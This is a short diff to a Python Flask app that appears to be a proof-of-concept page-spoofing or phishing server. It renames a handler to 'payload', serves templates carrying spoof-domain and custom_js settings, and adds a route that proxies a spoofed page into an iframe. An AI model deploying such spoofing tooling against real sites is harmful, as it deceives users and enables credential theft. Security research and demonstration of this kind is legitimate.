@@ -1,5 +1,6 @@
 #!/usr/bin/env python2.7
 from flask import Flask, render_template
+import urllib2
 
 ### Config
 vuln_url = 'http://127.0.0.1:5000/vulnerable.html'              # Vulnerable Page
@@ -16,8 +17,13 @@ def index():
     return render_template('index.html', vuln_url=vuln_url)
 
 @app.route('/index2.html')
-def login():
+def payload():
     return render_template('index2.html', spoof_page_domain=spoof_page_domain, spoof_page_full_url = spoof_page_full_url, spoof_page_title=spoof_page_title, custom_js=custom_js) 
+
+@app.route('/iframe.html')
+def iframe():
+    return urllib2.urlopen(spoof_page_full_url).read()
+
 
 if __name__ == '__main__':
     try:
